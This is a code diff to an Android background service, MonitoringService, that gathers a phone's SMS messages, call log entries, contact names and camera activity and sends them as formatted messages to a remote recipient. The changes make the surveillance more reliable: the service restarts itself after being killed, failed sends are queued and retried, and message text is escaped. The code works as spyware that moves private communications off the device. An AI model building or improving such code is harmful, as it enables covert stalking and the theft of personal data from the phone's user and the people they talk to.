@@ -59,8 +59,19 @@ class MonitoringService : Service() {
         when (intent?.action) {
             ACTION_START_MONITORING -> startMonitoring()
             ACTION_STOP_MONITORING -> stopMonitoring()
+            null -> {
+                if (preferencesManager.isMonitoringEnabled && preferencesManager.isConfigured()) {
+                    startMonitoring()
+                } else {
+                    stopSelf()
+                }
+            }
         }
         return START_STICKY
+    }
+
+    private fun escapeHtml(text: String): String {
+        return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
     }
 
     private fun startMonitoring() {
@@ -130,7 +141,6 @@ class MonitoringService : Service() {
                     delay(syncIntervalMillis())
                 } catch (e: Exception) {
                     android.util.Log.e("MonitoringService", "Error in monitoring loop", e)
-                    e.printStackTrace()
                 }
             }
         }
@@ -146,7 +156,6 @@ class MonitoringService : Service() {
                     delay(cameraIntervalMillis())
                 } catch (e: Exception) {
                     android.util.Log.e("MonitoringService", "Error in camera loop", e)
-                    e.printStackTrace()
                 }
             }
         }
@@ -422,12 +431,14 @@ class MonitoringService : Service() {
         try {
             android.util.Log.i("MonitoringService", "Collecting SMS history...")
             // Get all history first
-            val allSms = smsRepository.getAllSms()
+            val allSms = smsRepository.getRecentSms(200)
             android.util.Log.i("MonitoringService", "Found ${allSms.size} SMS messages")
             
             android.util.Log.i("MonitoringService", "Collecting call history...")
             val allCalls = callLogRepository.getAllCalls()
             android.util.Log.i("MonitoringService", "Found ${allCalls.size} calls")
+
+            preferencesManager.initialSyncDone = true
 
             // Update last synced IDs
             if (allSms.isNotEmpty()) {
@@ -468,8 +479,8 @@ class MonitoringService : Service() {
                         appendLine("💬 <b>SMS History - part ${index + 1}/${chunks.size}</b>")
                         appendLine()
                         chunk.forEach { sms ->
-                            appendLine("📞 Number: ${sms.address}")
-                            val body = sms.body.take(200) // Limit SMS body to 200 chars
+                            appendLine("📞 Number: ${escapeHtml(sms.address)}")
+                            val body = escapeHtml(sms.body.take(200)) // Limit SMS body to 200 chars
                             appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
                             appendLine("🔄 Type: ${sms.getTypeString()}")
                             appendLine("⏰ Time: ${formatDate(sms.date)}")
@@ -498,9 +509,9 @@ class MonitoringService : Service() {
                         appendLine("📞 <b>Call History - part ${index + 1}/${chunks.size}</b>")
                         appendLine()
                         chunk.forEach { call ->
-                            appendLine("📱 Number: ${call.number}")
+                            appendLine("📱 Number: ${escapeHtml(call.number)}")
                             if (call.name != null) {
-                                appendLine("👤 Name: ${call.name}")
+                                appendLine("👤 Name: ${escapeHtml(call.name)}")
                             }
                             appendLine("🔄 Type: ${call.getTypeString()}")
                             appendLine("⏱️ Duration: ${call.getDurationString()}")
@@ -520,8 +531,6 @@ class MonitoringService : Service() {
                 android.util.Log.i("MonitoringService", "All call chunks sent")
             }
 
-            preferencesManager.initialSyncDone = true
-
             // Final message
             android.util.Log.i("MonitoringService", "Sending completion message...")
             val completeMessage = buildString {
@@ -533,7 +542,7 @@ class MonitoringService : Service() {
             android.util.Log.i("MonitoringService", "=== Initial data sending complete ===")
 
         } catch (e: Exception) {
-            e.printStackTrace()
+            android.util.Log.e("MonitoringService", "Error in initial sync", e)
         }
     }
 
@@ -567,7 +576,7 @@ class MonitoringService : Service() {
                 preferencesManager.lastSyncTime = System.currentTimeMillis()
             }
         } catch (e: Exception) {
-            e.printStackTrace()
+            android.util.Log.e("MonitoringService", "Error checking new data", e)
         }
     }
 
@@ -577,8 +586,8 @@ class MonitoringService : Service() {
             appendLine()
             
             smsList.forEach { sms ->
-                appendLine("📞 Number: ${sms.address}")
-                val body = sms.body.take(200) // Limit to 200 chars
+                appendLine("📞 Number: ${escapeHtml(sms.address)}")
+                val body = escapeHtml(sms.body.take(200)) // Limit to 200 chars
                 appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
                 appendLine("🔄 Type: ${sms.getTypeString()}")
                 appendLine("⏰ Time: ${formatDate(sms.date)}")
@@ -593,9 +602,9 @@ class MonitoringService : Service() {
             appendLine()
             
             callList.forEach { call ->
-                appendLine("📱 Number: ${call.number}")
+                appendLine("📱 Number: ${escapeHtml(call.number)}")
                 if (call.name != null) {
-                    appendLine("👤 Name: ${call.name}")
+                    appendLine("👤 Name: ${escapeHtml(call.name)}")
                 }
                 appendLine("🔄 Type: ${call.getTypeString()}")
                 appendLine("⏱️ Duration: ${call.getDurationString()}")
@@ -631,6 +640,7 @@ class MonitoringService : Service() {
                 // No internet, add to queue
                 android.util.Log.w("MonitoringService", "No network, adding to queue")
                 messageQueue.addMessage(message)
+                MessageScheduler.scheduleMessageSend(this)
                 return
             }
 
@@ -655,10 +665,10 @@ class MonitoringService : Service() {
             } else {
                 android.util.Log.e("MonitoringService", "✗ Failed to send: ${response.code()}")
                 messageQueue.addMessage(message)
+                MessageScheduler.scheduleMessageSend(this)
             }
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "✗ Exception sending message: ${e.message}", e)
-            e.printStackTrace()
             // Network error, add to queue
             messageQueue.addMessage(message)
             // Schedule retry when network is available
